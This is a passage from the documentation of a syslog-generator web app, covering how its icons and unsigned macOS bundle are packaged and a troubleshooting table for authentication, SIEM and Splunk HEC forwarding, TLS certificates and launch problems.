overrides the search.

**Icons.** `packaging/icons/` holds the PNG set and two containers built by hand
in `packaging/build-macapp.sh`'s neighbourhood: ImageMagick writes an `.icns`
that is really a PNG with the wrong extension, and an `.ico` of uncompressed BMP
frames that came to 370 KB. Both are assembled directly instead — the ICO with
PNG frames (59 KB) and the ICNS as a proper `icns` container of five slots
(154 KB).

**The macOS bundle is unsigned.** A `.app` is a directory with a fixed layout, so
it is assembled on Linux like everything else here; signing and notarising need a
Mac and an Apple Developer account. Gatekeeper will therefore ask for
confirmation on first launch, which `INSTALL.txt` says rather than hides.

---

## 17. Troubleshooting

| Symptom | Cause / fix |
|---------|-------------|
| Every page bounces to the sign-in screen | No session. Sign in; if it loops, the backend restarted (sessions are in memory). |
| Signed in, then everything returns 401 | The backend restarted, or the 8-hour session expired. Sign in again. |
| "That code is not valid right now" | The host clock and the phone clock disagree by more than ~30 s. Fix NTP on the server. |
| "That code was already used" | Correct — a code works once. Wait for the authenticator to roll over. |
| Locked out after typos | 5 failures locks the account for 5 minutes. Wait it out, or restart the backend to clear it. |
| Lost the authenticator | `node server.js --reset-2fa` on the host, then restart it and scan the new QR. |
| The enrolment QR will not scan | Enlarge the terminal (the console QR needs ~53 columns) or use **Can't scan it?** for the secret. A QR rendered light-on-dark by a screenshot tool will not scan — use the page or the terminal directly. |
| Forgot the password | Ask an admin to set a new one on the Account page, or `node server.js --set-password <user> '<pw>'`. With no admin left, `node server.js --reset-auth` wipes every account back to the default admin. |
| "That needs an admin account" | You are signed in as a `user`. An admin can promote you on the Account page. |
| "That is the only admin" | Promote a second account first; the install always keeps at least one admin. |
| The collector panel is not remembered | You are serving statically, or running `JEDI_AUTH=off` — there is no profile to save into. |
| The history row is not shown | Same cause — it appears only once a profile has loaded. |
| A receiver is missing from the history | It is only recorded on **Test**, on switching **Forward live** on, or via **Save**. Editing the fields alone does not record it. |
| An old receiver vanished | The history keeps the 12 most recently used. |
| A user sees someone else's collector | They cannot: it is keyed to the session's account. Check who is actually signed in via the header badge. |
| Signed out of every browser at once | Expected after a backend restart — sessions live in memory only. |
| Sign-in page never appears | You are serving statically (`python3 -m http.server`), which enforces nothing. Use `node server.js`. |
| "Forward live" green but SIEM sees nothing | UDP is fire-and-forget. Click **Test** or switch to TCP/HEC; run `tcpdump -n port 514` on the collector. |
| HEC foot says "HEC token required" | The token field is empty — the queue is held rather than posting batches Splunk would reject. |
| HEC returns `Invalid token` / `Incorrect index` | The token is wrong or disabled, or it is not allowed to write to that index (Splunk: *Data inputs › HTTP Event Collector*). |
| HEC returns a TLS error | `wrong version number` → the input is plain HTTP, untick **HTTPS**. A certificate rejection → tick **skip cert** to accept Splunk's self-signed one. |
| Test shows `Connection refused` | Host reachable, nothing listening on that port/proto — enable the SIEM's syslog input. |
| Test shows `timed out` | Firewall/routing dropping traffic between the hosts. |
| Forwarding foot says "backend not running" | You opened the app statically (python/`file://`). Serve it with `node server.js`. |
| The browser warns about the certificate | Expected for a self-signed one. Click through, or give the host a DNS name and use a CA-issued certificate. |
| `http://` stopped working after enabling TLS | That port speaks TLS now. Use `https://`, or set `JEDI_HTTP_REDIRECT_PORT`. |
| A new certificate has not taken effect | Certificates are read at startup and `certs/` is not watched — `pm2 restart` (or restart the process). |
| Port 8099 in use | `PORT=9000 node server.js`. |
| Nothing happens on Start | Rate slider at 0, or a volume cap already reached — check the volume foot. |
| The menu entry does nothing, no window | Run `jedi desktop --debug` in a terminal, and read `~/.local/share/apex-jedisyslogger/last-launch.log`. |
| The app opens as a browser tab, not a window | No Chromium-family browser was found. Install Chromium/Chrome/Brave/Edge, or point `JEDI_BROWSER` at one. |

---

Created By: **Alfredo Nacino** · [www.alfredonacino.com](https://www.alfredonacino.com) · alfredo@nacino.net
